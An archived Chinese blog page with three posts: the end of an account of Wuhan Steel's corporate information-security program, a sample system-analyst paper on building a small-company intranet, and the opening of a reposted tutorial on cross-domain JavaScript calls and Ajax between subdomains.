SESA事件分析系统的应用，从现有的防病毒服务器中获取数据进行分析。该系统有病毒排行、中毒机器排行、用户中毒排行等功能，能辅助对接入用户的管理以及病毒肪范行动决策。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 武钢还对区城何防火墙进行了安装部署。通过控制Dialup区域路由器拨号用户的接入、VPN1区域路由器的接入，来实施访问控制安全策略，以限定访问 的主机范围和服务。通过外单位区城划分来实施访问控制安全策略以限定外单位用户访问的内网主机范围和服务。保护CRM系统通过设里访问控制安全策略以限定 访问的主机范围和服务。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 通过区域间IDP系统的部署，在网络</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">关键位置部署入侵俭测与防护设备</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">，实时对网络中的协议和流最进行异常检测，及时发现和阻断网络中存在的攻击行为，确保了关键应用服务器的安全。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 通过</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">网络审计</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">系统，实时监控审计网络中对OA, HR等服务器的HTTP、TELNET及FTP各类应用服务，在实时监控的同时也方便了事后取证。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 通过</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">访问控制</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">系统.对于移动VPN用户访问OA、HR等企业</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">重要数据连接进行加密、认证和用户级别的授权</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 补定</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">更新系统</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">的应用使得管理人员能及时获得所有已知安全问网的修补程序，并把这些修补程序及时分发到所有的客户机。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 武钢还对主机服务器进行了加固，根据需要加固的内容，消除系统已知的漏洞或降低系统存在的风险。加固后，可以加强服务器的抗病毒及防止非法入侵的能力。 通过停用某些不必要的服务，消除系统的部分漏洞；通过增强服务器的安全配置，提高系统的安全性;通过软件升级或者安装补丁，加强系统的安全性.</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> </span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">网络管理</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">系统实现了武钢主干网拓扑管理、武钢网络性能管理以及武钢网络设备监控。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 桌面管理系统的应用为各厂网络管理员的管理工作提供协助，在管理中心，对本单位终端设备的实时监管。</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">规范了客户机的操作</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">，使非正常程序和软件无法在客户 机上运行，并且使客户机无法违规外联访问Internet，同时远程协助功能也能帮助管理员进行客户机的远程维护操作。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 另外，武钢还有一套</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">反垃圾邮件系统</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">，部署在邮件服务器前端，</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">进行垃圾邮件及病毒邮件的过滤和转发</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">。该项目实施后从根本上提高了武钢信息系统的安全性，解决了当时武钢网络中存在的显著问题，完成了风险评估后的安全规划内容，为武钢信息安全体系的完善和发展打下坚实基础。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2006年10月1日，全武钢实现</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #0000ff;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">生产管理网与互联网的物理隔离</span><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">，进一步提高武钢内网的安全和信息保密。互联网从内网完全隔离后，主要解决了五方面的问 题:互联网业务从公司生产网上分离之后，提高了生产网安全性和运行效率，减少了病毒对系统的侵害;集团公司机关部处室和各个主休厂通过上网专用区形式加强 了互联网的网络管理;安装行为审计系统，对不安全因素及时告警，对有关行为可以追溯;提高了工作效率，提高了互联网的利用效率;移动用户通过动态令牌双因 子认证后，经过SSL VPIV加密通道访问OA, HR, CRM等应用，保证了数据的安全访问。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2007年，武钢增加了主干网站 点综合防护系统，通过网络流量监控系统，对网络流盘的进行智能分析，对关键网络节点或关键网络链路上网络流且的长期实时监控分析，并提供长期的流量分析报 告。统计分析结果能够为网络改造、升级以及应用系统的变更提供决策依据。为网络性能优化提供管理依据。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2009年8月10日，某厂反映访问大型机网速慢，通过网络流且监控系统立刻对该厂当日的所有流最进行抓包分析，网络流量回溯，并通过我们的技术分析，在短时间内马上找到了引起网络访问速度慢的原因，并迅速解决了问题。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: bold;text-decoration: none"> 五、信息安全管理体系建设</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 建立健全的信息安全管理休系对武钢的安全管理工作和武钢信息安全的发展意义重大。这一体系的建立将提高员工信息安全意识，提升公司信息安全管理的水平。 增强公司抵御灾难性事件的能力。通过信息安全管理体系的建设，可有效提高公司对信息安全风险的管控能力，通过与技术安全加固相结合，使得信息安全管理更加 科学有效。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 武钢信息安全管理体系确定了公司的信息安全方针是:全员参与、管控并重、持续改进、确保安全。该方针的含义是:在遵守相关 法令、法规的前提下，坚持技术与管理并重、以安全保发展、在发展中求安全的信息安全管理基本原则，在采用国内外信息安全先进技术的同时，结合国际信息安全 管理标准和最佳实践，在全公司范围内建立先进的、可持续改进的信息安全管理体系。全员参与信息安全管理体系建设，通过信息安全宣传、教育与培训。不断提高 公司员工的个人信息安全素质和公司信息系统的安全防范、安全管理能力，保障与公司重要生产经营相关的信息系统安全稳定运行;通过不断地对公司信息安全管理 体系进行内部审核和管理评审，使公司信息安全管理体系得以持续改进。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 经过对武钢信息系统多层次、整体、主动的安全防御体系构建及系统 优化，使公司的主千网络安全得到了最大的改餐，2004年10月以来，没有发生大范围的信息安全事件，保证了武钢产销系统的安全稳定运行。为武钢发展注入 了后发势力，对提高武钢整体管理水平，促进管理现代化，转换经营机制，建立现代企业制度.都将发挥巨大的作用。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 几年来武钢信息安全体 系的建立，实现了公司信息与息系统的保密性、完整性、可用性;实现了全年重大信息安全事故为零;公司级信息安全系统功能运转率达到98%以上;公司级信息 系统作业率达到45%以上;混合型病毒和恶意代码、外部人员通过网络实施对信息系统的入侵攻击、内部人员通过网络直接入侵和不规范操作这当初武钢信息系统 中的三大威胁已成为历史;公司级信息系统管理、使用、维护人员信息安全培训覆盖率超过80%。这使得武钢的信息安全体系建设获得了业界一致好评。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">----------------------------------------------------------------------------------------------------------------------</span> <br /> <p style="text-align: center;margin-top: 0pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 14pt;vertical-align: baseline;font-weight: bold;text-decoration: none">系统分析员论文样例</span></p> <p style="text-align: center;margin-top: 0pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">中石化金卡工程江苏省联合办公室 尤一浩</span></p> <p style="text-align: center;margin-top: 0pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">江苏省石油集团公司信息技术管理处 司文全</span></p> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /> <p style="text-align: center;margin-top: 0pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 12pt;vertical-align: baseline;font-weight: bold;text-decoration: none">论建立企业内部网INTRANET的策略</span></p> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /> <p style="margin-top: 0pt;text-indent: 21pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">近年来，英特网internet以其丰富的应用在社会的迅速得以普及，internet技术的先进性，引起的企业的广泛关注。于是利用internet技术的思想，在企业局域网（LAN）上加以应用，组建企业内部网Intranet（在互联网上，相对于英特网现在有人称为内特网）成为时尚。</span></p> <p style="margin-top: 0pt;text-indent: 21pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span></p> <p style="margin-top: 0pt;text-indent: 21pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">作为一名单位内信息中心的技术骨干，我有幸独立完成了整体方案设计、组织参与了本单位的Intranet的建设并承担了部分软件的开发工作。该方案实施后，集成了原有的业务应用系统，建立了企业内部信息发布系统和FTP文件传输系统，并与下属单位实现了网络互连，实现了相互间信息共享，并利用VPN技术利用 INTERNET网能访问总公司的Intranet。 现将实施这一工程的一些方法和策略以及我们采用的一些措施介绍如下，希望能对组建中小企业Intranet网有所启发：</span></p> <p style="margin-top: 0pt;text-indent: 21pt;margin-bottom: 0pt"><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span></p> <p> <span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 基本情况：1、应用单位情况：某外运集团在某口岸外贸运输企业，是一家经贸部属企业，是集团的分布各地的一个分支机构，承担进出口货物的运输代理，以进出口货物的单据流转为主配合物流为客户服务作为主业务。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2、计算机应用情况：现企业有一局城网，NT 4.0平台，运行的核心应用软件为集装箱运输代理业务系统，为VISUAL FOXPRO 5.0开发的网络多用户系统。还有其它一些人事、财务、统计软件、办公软件（OFFICE）在使用。有专门的计算机应用机构4人。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 本单位Intranet网的实施主要是针对系统内信息流转不畅的需求而得以进行的。在实施方案的过程中我们主要进行了如下的策略选择：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 1、网络建设方案：单位原有一局城网，25个信息息点。但随着信息化建设的高要求，已远远不能满足需要。单位有6层办公楼，要求人手一机，同时要求与三个基层单位（车队、外运仓库）和一个集装箱站相连。领导层、中层干部等都要求有相应数据和各种查询。对于本单位情况，首先在办公楼进行了综合布线工程，由于办公楼不大，集用了集中走线的方案，采用5类线，100M带宽，125个信息点。交换机采用12口3COM 3C5092A 10/100M自适应设备，共享HUB采用数个3COM 16口HUB。并选用CISCO 3600作为路由器，4个广域网口连接4 个远程基层单位和箱站，采用拨号方式.并将来打算用帧中继FR与北京总部相连（因为经费，暂时没有申请）。由于单位多为PC机，有庞大的WINDOWS用户群，故网络平台也采用WINDOWS NT4.0.采用Intranet的基础协议TCP/IP作为网络协议。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 另外对于办公楼较大的可采用采用结构化布线，大对数电缆做主干，设主工作间、每层设水平工作间的方案进行。若有好几个楼群如校园网，可采用光纤做主干网（FDDI），再在每个楼实行P&amp;S布线。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2、 软件平台的选择：当前流行的Intranet平台，有A、基于UNIX，B、基于LINUX（开放源代码的OS） C、基于微软平台WINDOWS NT。考虑到中小企业的特点、可供选择的第三方软件比较多、支持微软平台的软件厂商多以及方便用户简便易操作、GUI界面等因素，我们选择了 windows nt4.0作为网络操作系统,用自身配备的IIS4.0作为WEB平台,IE4.0作为客户Intranet网上浏览平台. 相比于SYBASE、ORCALE、INFORMIX、DB2等大型数据库由于SQL SERVER是与NT平台具与极佳的配合性能的小大型数据库,对中小型企业较为合适,自然就选择SQL SERVER6.0作为数据库平台. 另外，用LINUX平台技术当前也十分红火，从技术上讲也是完全可以胜任的，只是考虑到学习上的要一断时间，以及用户的接受能力故未采用。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 3.由于我们自已的技术力量较强,并且面对外运行业的商品化软件较少.我们打算自已开发INTRANET上一些WEB应用软件.开发平台用VISUAL BASIC/FRONT PAGE/Html editor,由于还要开发一些交互式WEB应用程序，还要采集原应用系统的数据。需要掌握相应用交互式开发技术和与数据库相连的技术，如CGI（公共网关接口）、API（应用程序编程接口）、ASP（活动服务器页）、ODBC（开放数据库互连）、RDO/ADO（ACTIVEX DATA OBJECT活动数据对象）。在上述技术中，考虑到响应速度和效率，我建议采用ASP加ADO的技术进行开发。并且这是当前和将来的 INTERNET/Intranet网主流开发技术。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 4、内网与外网的互通以及安全考虑：由于属中小企业，单位上英特网的并发用户数一般不会超过15人，我们采用了较为低廉的ISDN一线通方式，专用一台 PC用安装了代理服务器软件（PROXY），可实现按需拨号、HTTP代理、FTP代理、TELNET代理、SMTP/POP</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 邮件代理、用户管理等，可设快速缓冲。当然，用DDN方式，申请合法的IP地址再设代理的方式也可行，只是由于经费的原因，没有选择。由于内外网的互通，如果没有一定的安全机制，将使公司的内部数据、机器、应用系统受病毒或黑客的攻击或非授权访问等。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 内外网间的安全技术有包过滤、防火墙、安全代理服务等，由于我们选择的代理服务器软件已有部分安全方面的机制并且内部数据的安全措施、管理制度、备份机制做的还可以。故没有在这方面投入更多的资金。在内部局域网上，我们选择了NET VRV（50用户）网络版防病毒软件，在服务器端和客户端都各自安装相应的版本，保证了内网的安全可靠性。当前，做网络安全的公司很多，如王江民的KV系列、瑞星公司等都可选择。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 5、原有的应有系统与Intranet技术的集成：由于原应用系统是基于FOXPRO，数据库为文件型数据库，所选的WEB应用开发环境并不能直接操作 FOXPRO数据库。对此我们有另外编制了一个软件用于每天从应用系统中将管理者与领导层要的数据导入SQL SERVER中，再以SQL SERVR为后台，编制WEB交互查询系统。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 6、与集团总部的相连：现在WIONDOWSNT4.0支持一种新技术即VPN(虚拟专用网),对于实时性要求不高又受经费困扰的应用来说,无疑是一种较为可行的方案,由于总部的条件较好,已建设好INTRANET网,并通过路由器以DDN与INTERNET直通.分公司在目前条件下,与总公司的连接是暂通过INERNET网,并在此链路基础上,运行PPTP协议(而非PPP协议),虚拟出一个数据通道,并在此基础上,通过用户身份验证即可实现总公司 Intranet与分公司LAN的连接.现在的应用有,分公司的LAN用户可直接浏览总公司的Intranet网的WEB站点.同时,全系统的业务统计软件也是改为通过WEB应用程序实现的。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> Intranet网运行后,在公司的用户间获得好评,客户界面(IE)的单一化,简化用户培训学习的过程.同时,网络的建成,极大方便了系统内信息和单据的流转速度,文件、数据的上传、下载十分方便.原有的应用系统数据还可通过IE浏览查询.部分WEB应用程序的建立,使客户端的维护成本大大降低.同时 Intranet的成功运行，也使得我们的信息部门的地位有所提高。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 但是，由于单位性质、规模的许多局限性，诸如费用、本身的技术水平、系统分析能力等，使一些应用走了简单、实用、低廉的策略。我们仅做了一台WEB服务器、一台SQLSERVER服务器和一台主域NT服务器，由于机器较少，没有作域名分配；对于与原文件型数据库的应用系统，没有采用效率更好的方法，做了简单化处理；与总公司总部的相连，速度稍难忍受、高峰堵塞严重，一般使用都各分公司划时间段使用；另外，在说服领导花钱投入加以重视方面还有待改进；也许，采用与软件公司、ISP等专业公司合作开发会更好地把本企业Intranet网做好。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 鉴于上述原因，我认为我们公司的Intranet网将来还要作如下方面的改进：</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 1、通信线路的改进：随着各种数据通讯网的建立和改善以及费用的逐步下降，分公司与总公司、分公司与基单位将来都应该采用DDN/FR甚至光缆等专线接入。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 2、软件应用模式从DOS单用户、文件型数据库多用户、C/S、向B/S结构、三层结构和多层次结方向方向发展，我们单位，将来的应用升级可直接使用B /S结构、三层结构，在开发技术中要广泛使用面向对象OOP、COM/DCOM构件组件、ADO数据库连接对象、ASP技术。并且开发方式也要采取与专业技术软件公司进行合作或委托开发的形式，否则，自已开发的软件的质量、可靠性等方面都难以达到软件工程的高要求；另外，更要在开发中重需求分析、重建模（可采用UML建模技术）、加强项目管理、团队协作。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"> 3、在1-2年内，用专线接入INTERNET网，建立基于INTERNET网的客户查询系统，在内外网间设立防火墙。</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none">-------------------------------------------------------------------------------------------------------------</span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span> <br /><span style="background-color: transparent;font-style: normal;font-family: arial;color: #000000;font-size: 11pt;vertical-align: baseline;font-weight: normal;text-decoration: none"></span></p> <p class="read-more">Continue reading <a class="heading" href="/%E5%AE%89%E5%85%A8/2011/06/09/e3-80-90-e5-8f-82-e8-80-83-e3-80-91-e8-ae-be-e8-ae-a1-e4-bc-81-e4-b8-9a-e4-bf-a1-e6-81-af-e7-b3-bb-e7-bb-9f-e7-9a-84-e5-ae-89-e5-85-a8-e4-bd-93-e7-b3-bb.html" data-flip="title">【参考】设计企业信息系统的安全体系</a></p> </article> <article id="post-web%E5%89%8D%E7%AB%AF/2011/06/09/%e7%96%af%e7%8b%82%e7%9a%84%e8%b7%a8%e5%9f%9f%e6%8a%80%e6%9c%af" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/web%E5%89%8D%E7%AB%AF/2011/06/09/e7-96-af-e7-8b-82-e7-9a-84-e8-b7-a8-e5-9f-9f-e6-8a-80-e6-9c-af.html" data-flip="title"> 【转】疯狂的跨域技术 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T16:44:15+08:00">09 Jun 2011</time> in <span>Web前端</span> on <span>Javascript web 前端</span>, <span>Web</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> <p>转了<a title="http://blog.csdn.net/raychase/archive/2011/01/09/6125652.aspx" href="http://blog.csdn.net/raychase/archive/2011/01/09/6125652.aspx">http://blog.csdn.net/raychase/archive/2011/01/09/6125652.aspx</a></p> <p class="blogstory">嵌套转: <br />原帖地址:<a href="http://itgeeker.com/mathml/readpaper?pid=53">http://itgeeker.com/mathml/readpaper?pid=53</a></p> <p class="blogstory">JavaScript 是一种在Web开发中经常使用的前端动态脚本技术。在JavaScript中，有一个很重要的安全性限制，被称为“Same-Origin Policy”（同源策略）。这一策略对于JavaScript代码能够访问的页面内容做了很重要的限制，即JavaScript只能访问与包含它的文档在同一域下的内容。</p> <p class="blogstory">JavaScript这个安全策略在进行多iframe或多窗口编程、以及Ajax编程时显得尤为重要。根据这个策略，在baidu.com下的页面中包含的JavaScript代码，不能访问在google.com域名下的页面内容；甚至不同的子域名之间的页面也不能通过JavaScript代码互相访问。对于Ajax的影响在于，通过XMLHttpRequest实现的Ajax请求，不能向不同的域提交请求，例如，在abc.example.com下的页面，不能向def.example.com提交Ajax请求，等等。</p> <p class="blogstory">然而，当进行一些比较深入的前端编程的时候，不可避免地需要进行跨域操作，这时候“同源策略”就显得过于苛刻。本文就这个问题，概括了跨域所需要的一些技术。</p> <p class="blogstory">下面我们分两种情况讨论跨域技术：首先讨论不同子域的跨域技术，然后讨论完全不同域的跨域技术。</p> <p class="blogstory"><b>（一）不同子域的跨域技术。</b></p> <p class="blogstory">我们分两个问题来分别讨论：第一个问题是如何跨不同子域进行JavaScript调用；第二个问题是如何向不同子域提交Ajax请求。</p> <p class="blogstory">先来解决第一个问题，假设example.com域下有两个不同子域：abc.example.com和def.example.com。现在假设在def.example.com下面有一个页面，里面定义了一个JavaScript函数：</p> <p class="blogstory">function funcInDef() {</p> <p class="blogstory">.....</p> <p class="blogstory">}</p> <p class="blogstory">我们想在abc.example.com下的某个页面里调用上面的函数。再假设我们要讨论的abc.example.com下面的这个页面是以iframe形式嵌入在def.example.com下面那个页面里的，这样我们可能试图在iframe里做如下调用：</p> <p class="blogstory">window.top.funcInDef();</p> <p class="blogstory">好，我们注意到，这个调用是被前面讲到的“同源策略”所禁止的，JavaScript引擎会直接抛出一个异常。</p> <p class="blogstory">为了实现上述调用，我们可以通过修改两个页面的domain属性的方法做到。例如，我们可以将上面在abc.example.com和def.example.com下的两个页面的顶端都加上如下的JavaScript代码片段：</p> <p class="blogstory">&lt;script type=&quot;text/javascript&quot;&gt;</p> <p class="blogstory">document.domain = &quot;example.com&quot;;</p> <p class="blogstory">&lt;/script&gt;</p> <p class="blogstory">这样，两个页面就变为同域了，前面的调用也可以正常执行了。</p> <p class="blogstory"><font color="#0000ff">我试过,在</font><a href="http://www.abc.com"><font color="#0000ff">www.abc.com</font></a><font color="#0000ff">中请求abc.com/action就算跨域（前面没有带www），即使采用上面的方法仍然行不通。</font></p> <p class="blogstory">这里需要注意的一点是，一个页面的document.domain属性只能设置成一个更顶级的域名（除了一级域名），但不能设置成比当前域名更深层的子域名。例如，abc.example.com的页面只能将它的domain设置成example.com，不能设置成 sub.abc.example.com，当然也不能设置成一级域名com。</p> <p class="blogstory">上面的例子讨论的是两个页面属于iframe嵌套关系的情况，当两个页面是打开与被打开的关系时，原理也完全一样。</p> <p class="blogstory">下面我们来解决第二个问题：如何向不同子域提交Ajax请求。</p> <p class="blogstory">通常情况下，我们会用与下面类似的代码来创建一个XMLHttpRequest对象：</p> <p class="blogstory">factories = [</p> <p class="blogstory">function() { return new XMLHttpRequest(); },</p> <p class="blogstory">function() { return new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); },</p> <p class="blogstory">function() { return new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); }</p> <p class="blogstory">];</p> <p class="blogstory">function newRequest() {</p> <p class="blogstory">for(var i = 0; i &lt; factories.length; i++) {</p> <p class="blogstory">try{</p> <p class="blogstory">var factory = factories[i];</p> <p class="blogstory">return factory();</p> <p class="blogstory">} catch(e) {}</p> <p class="blogstory">}</p> <p class="blogstory">return null;</p> <p class="blogstory">}</p> <p class="blogstory">上面的代码中引用ActiveXObject，是为了兼容IE6系列浏览器。每次我们调用newRequest函数，就获得了一个刚刚创建的Ajax对象，然后用这个Ajax对象来发送HTTP请求。例如，下面的代码向abc.example.com发送了一个GET请求：</p> <p class="blogstory">var request = newRequest();</p> <p class="blogstory">request.open(&quot;GET&quot;, &quot;http://abc.example.com&quot; );</p> <p class="blogstory">request.send(null);</p> <p class="blogstory">假设上面的代码包含在一个abc.example.com域名下的页面里，则这个GET请求可以正常发送成功，没有任何问题。然而，如果现在要向def.example.com发送请求，则出现跨域问题，JavaScript引擎抛出异常。</p> <p class="blogstory">解决的办法是，在def.example.com域下放置一个跨域文件，假设叫crossdomain.html；然后将前面的newRequest函数的定义移到这个跨域文件中；最后像之前修改document.domain值的做法一样，在crossdomain.html文件和 abc.example.com域下调用Ajax的页面顶端，都加上：</p> <p class="blogstory">&lt;script type=&quot;text/javascript&quot;&gt;</p> <p class="blogstory">document.domain = &quot;example.com&quot;;</p> <p class="blogstory">&lt;/script&gt;</p> <p class="blogstory">为了使用跨域文件，我们在abc.example.com域下调用Ajax的页面中嵌入一个隐藏的指向跨域文件的iframe，例如：</p> <p class="blogstory">&lt;iframe name=&quot;xd_iframe&quot; style=&quot;display:none&quot; src=&quot;http://def.example.com/crossdomain.html&quot;&gt;&lt;/iframe&gt;</p> <p class="blogstory">这时abc.example.com域下的页面和跨域文件crossdomain.html都在同一个域（example.com）下，我们可以在abc.example.com域下的页面中去调用crossdomain.html中的newRequest函数：</p> <p class="blogstory">var request = window.frames[&quot;xd_iframe&quot;].newRequest();</p> <p 